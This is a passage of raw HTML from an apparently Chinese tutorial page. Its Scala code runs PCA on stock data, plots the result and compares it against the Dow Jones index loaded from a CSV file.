&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;points&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;pca&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;project&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-6&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plotData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;points&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-9&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-10&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;canvas&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;PlotCanvas&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;LinePlot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Merged Features Index&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                         &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plotData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                         &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Line&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Style&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DASH&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                         &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;RED&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613bf352878068-15&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;peer&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;setContentPane&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;canvas&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613bf352878068-16&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Dimension&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0026 seconds] --&gt;
&lt;p&gt;这段代码不仅执行了 PCA，还将结果绘成图像，y 轴表示特征值，x 轴表示每日。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/53c63c7784c49844fd6077d340ce50e1.jpg&quot; width=&quot;600px&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了能看出 PCA 合并的效果，我们现在通过如下方式调整代码将道琼斯指数加入到图像中：&lt;/p&gt;
&lt;p&gt;首先把下列代码添加到 def top 方法中：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613c2508492099&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
 //Verification against DJI
 //用道琼斯指数验证
    val verificationDataPath = basePath + &quot;PCA_Example_2.csv&quot;
    val verificationData = getDJIFromFile(new File(verificationDataPath))
    val DJIIndex = getDJIFromFile(new File(verificationDataPath))
    canvas.line(&quot;Dow Jones Index&quot;, DJIIndex._2, Line.Style.DOT_DASH, Color.BLUE)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c2508492099-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c2508492099-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c2508492099-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c2508492099-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c2508492099-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c2508492099-6&quot;&gt;6&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c2508492099-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Verification against DJI&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c2508492099-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//用道琼斯指数验证&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c2508492099-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;verificationDataPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;PCA_Example_2.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c2508492099-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;verificationData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIFromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;verificationDataPath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c2508492099-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DJIIndex&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIFromFile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;verificationDataPath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613c2508492099-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;canvas&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Dow Jones Index&quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DJIIndex&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Line&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Style&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;DOT_DASH&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;BLUE&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0014 seconds] --&gt;
&lt;p&gt;然后我们需要引入下列两个方法：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613c6872605657&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
  def getDJIRecordFromString(dataString: String): (Date,Double) = {

    //Split the comma separated value string into an array of strings
    //把用逗号分隔的数值字符串分解为一个字符串数组
    val dataArray: Array[String] = dataString.split(&#39;,&#39;)

    val format = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;)
    //Extract the values from the strings
    //从字符串中抽取数值

    val date = format.parse(dataArray(0))
    val close: Double = dataArray(4).toDouble

    //And return the result in a format that can later 
    //easily be used to feed to Smile
    //并以一定格式返回结果，使得该结果之后容易输入到Smile中处理
    (date,close)
  }

  def getDJIFromFile(file: File): (Array[Date],Array[Double]) = {
    val source = scala.io.Source.fromFile(file)
    //Get all the records (minus the header)
    //获取所有记录（减去标头）
    val data = source
        .getLines()
        .drop(1)
        .map(x =&amp;gt; getDJIRecordFromString(x)).toArray
    source.close()

    //turn the tuples into two separate arrays for easier use later on
    //将这些元组分隔为两个数组以方便之后使用
    val sortedData = data.sortBy(x =&amp;gt; x._1)
    val dates = sortedData.map(x =&amp;gt; x._1)
    val doubles = sortedData.map(x =&amp;gt;   x._2 )

    (dates, doubles)
  }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613c6872605657-37&quot;&gt;37&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613c6872605657-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDJIRecordFromString&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dataString&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span 